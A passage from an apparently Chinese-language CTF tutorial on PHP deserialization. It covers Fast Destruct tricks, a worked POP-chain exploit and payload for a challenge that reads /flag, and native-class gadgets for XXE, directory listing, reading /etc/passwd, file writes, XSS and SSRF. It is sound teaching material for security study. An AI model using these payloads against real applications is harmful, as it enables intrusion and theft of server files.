<li>如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</li>
</ol>
<p>Fast Destruct就是为了解决第二种情况的。</p>
<p><em>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</em></p>
<p>以这段代码为例：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;No!&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>当我们直接尝试反序列化A类触发其析构方法时会出现这样的错误：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught <span class="built_in">Exception</span>: No! in /<span class="keyword">var</span>/www/html/index.php:<span class="number">8</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 8</span></span><br></pre></td></tr></table></figure></div>

<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><p><strong>方法一</strong></p>
<p>修改序列化字符串的结构。这种方法在于使序列化数据存在问题，例如删除序列化数据中尾部的<code>&#125;</code>等，使其变成非法的序列化数据流，这样垃圾回收机制在反序列化时就会提前回收这个对象，从而实现Fast Destruct的方法。</p>
<p>例如上文中的那段代码，我们生成得到的序列化数据流为：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果我们将其修改为：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">0</span>:&#123;</span><br></pre></td></tr></table></figure></div>

<p>就可以提前触发到析构函数了。</p>
<p><strong>方法二</strong></p>
<p>数组的空引用。例如我们正常序列化一个数组，其中第一个元素是我们的对象，第二个元素是<code>Null</code>：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>] = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$a</span>[<span class="number">1</span>] = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们修改一下对象在数组中的下标：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:1;O:1:&quot;A&quot;:0:&#123;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样也是可以提前触发析构函数的。</p>
<p><strong>方法三</strong></p>
<p>修改对象元素数量。这种方法有点类似于绕过<code>__wakeup</code>的那个Payload，不过原理上还是非法的序列化数据流，还是上文的例子，我们得到的正常的序列化数据如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure></div>

<p>修改为：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>拓展一句</strong></p>
<p>值得一提的是，Fast Destruct不仅适用于触发<code>__destruct</code>，其他的一些魔术方法也是可以利用这种方法提前触发的，大家可以自己探索一下。</p>
<h4 id="Challenge5"><a href="#Challenge5" class="headerlink" title="Challenge5"></a>Challenge5</h4><p>看看以下这段代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&quot;GoodJob&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bad Job!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQLi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You Touch Me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fun</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$fun</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/CTF/i&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;NoNoNo&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Let&#x27;s say goodbye with a smile&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$func</span> == <span class="string">&quot;hello&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">bye</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lua</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hard</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;hard)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad times make a good man.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Json</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$format</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;format-&gt;<span class="title function_ invoke__">hello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;format = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;So Easy!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>前面是一个POP链条的构造，比较容易看出来，但是和常规的反序列化不同的是，本题的反序列化位点是这么写的：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;So Easy!&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这里将反序列化的内容赋值给了<code>$o</code>变量，然后通过<code>Exception</code>抛出了一个异常导致程序突然中止，此时的反序列化对象由于变量赋值的原因还没有被PHP垃圾处理机制回收，因而就导致还没有触发到<code>__destruct</code>程序就被终止了，因此这里需要Fast Destruct。</p>
<p>先来构造POP链，直接给出题目可以利用的链条：</p>
<pre class="mermaid">  graph TD;
    Reader::__wakeup-->Lua::__toString;
    Lua::__toString-->Json::__invoke;
    Json::__invoke-->Reader::__call;
    Reader::__call-->SQLi::bye;
    SQLi::bye-->Evil::backdoor;</pre>

<p>然后来构造Exp：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQLi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lua</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hard</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Json</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$format</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Reader</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; name = <span class="keyword">new</span> <span class="title class_">Lua</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; name -&gt; hard = <span class="keyword">new</span> <span class="title class_">Json</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; name -&gt; hard -&gt; format = <span class="keyword">new</span> <span class="title class_">Reader</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; name -&gt; hard -&gt; format -&gt; obj = <span class="keyword">new</span> <span class="title class_">SQLi</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; name -&gt; hard -&gt; format -&gt; obj -&gt; <span class="keyword">var</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; name -&gt; hard -&gt; format -&gt; obj -&gt; func = <span class="string">&quot;readfile&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<p><code>O:6:&quot;Reader&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Lua&quot;:1:&#123;s:4:&quot;hard&quot;;O:4:&quot;Json&quot;:1:&#123;s:6:&quot;format&quot;;O:6:&quot;Reader&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;obj&quot;;O:4:&quot;SQLi&quot;:2:&#123;s:4:&quot;func&quot;;s:8:&quot;readfile&quot;;s:3:&quot;var&quot;;s:5:&quot;/flag&quot;;&#125;&#125;&#125;&#125;s:3:&quot;obj&quot;;N;&#125;</code></p>
<p>然后就是按照上面的方法触发FastDestruct即可：</p>
<p><code>O:6:&quot;Reader&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Lua&quot;:1:&#123;s:4:&quot;hard&quot;;O:4:&quot;Json&quot;:1:&#123;s:6:&quot;format&quot;;O:6:&quot;Reader&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;obj&quot;;O:4:&quot;SQLi&quot;:2:&#123;s:4:&quot;func&quot;;s:8:&quot;readfile&quot;;s:3:&quot;var&quot;;s:5:&quot;/flag&quot;;&#125;&#125;&#125;&#125;s:3:&quot;obj&quot;;N;</code></p>
<h3 id="原生类反序列化"><a href="#原生类反序列化" class="headerlink" title="原生类反序列化"></a>原生类反序列化</h3><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><ul>
<li><p><code>SimpleXMLElement::__construct</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="string">&quot;http://localhost/evil.xml&quot;</span>,<span class="number">2</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><ul>
<li><p><code>Directory::read</code></p>
</li>
<li><p>利用版本：PHP 4、PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">Directory</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;resource = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$d</span>-&gt;resource)))&#123;<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>DirectoryIterator::__toString</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 可以使用glob协议来遍历，例如遍历一个拼接了md5数值的文件：</span></span><br><span class="line"><span class="comment">// $dir = &quot;/var/www/html&quot;;</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;glob:///var/www/html/flag[0-9a-zA-Z]*.php&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">valid</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">next</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>FilesystemIterator::__toString</code></p>
</li>
<li><p>利用版本：PHP 5 &gt;&#x3D; 5.3.0、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 可以使用glob协议来遍历</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">valid</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">next</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>GlobIterator::__toString</code></p>
</li>
<li><p>利用版本：PHP 5 &gt;&#x3D; 5.3.0、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 可以使用glob协议来遍历</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;./*&quot;</span>) <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><ul>
<li><p><code>SplFileObject::__toString</code> 、<code>SplFileInfo::__toString</code>、<code>SplTempFileObject::__toString</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者用伪协议base64直接输出，有时候有奇效</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>DOMDocument::loadHTMLFile</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>ZipArchive::getFromName</code></p>
</li>
<li><p>利用版本：PHP 5 &gt;&#x3D; 5.2.0、PHP 7、PECL zip &gt;&#x3D; 1.1.0</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="variable">$zip</span>=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&quot;a.zip&quot;</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&quot;a.zip&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">getFromName</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><ul>
<li><p><code>SplFileObject::write</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;./file&#x27;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$f</span>-&gt;<span class="title function_ invoke__">fwrite</span>(<span class="string">&quot;file&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>DOMDocument::saveHtmlFile</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;./1.php&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>ZipArchive::setArchiveComment</code>（有损写文件）</p>
</li>
<li><p>利用版本：PHP 5 &gt;&#x3D; 5.2.0、PHP 7、PECL zip &gt;&#x3D; 1.1.0</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="variable">$zip</span>=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&quot;a.zip&quot;</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="XSS与hash绕过"><a href="#XSS与hash绕过" class="headerlink" title="XSS与hash绕过"></a>XSS与hash绕过</h4><ul>
<li><p><code>Error::__toString</code></p>
</li>
<li><p>利用版本：PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure></div>


</li>
<li><p><code>Exception::__toString</code></p>
</li>
<li><p>利用版本：PHP 5、PHP 7</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$exp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><ul>
<li><p><code>SoapClient::__call</code></p>
</li>
<li><p>版本限制：PHP 5、PHP 7</p>
</li>
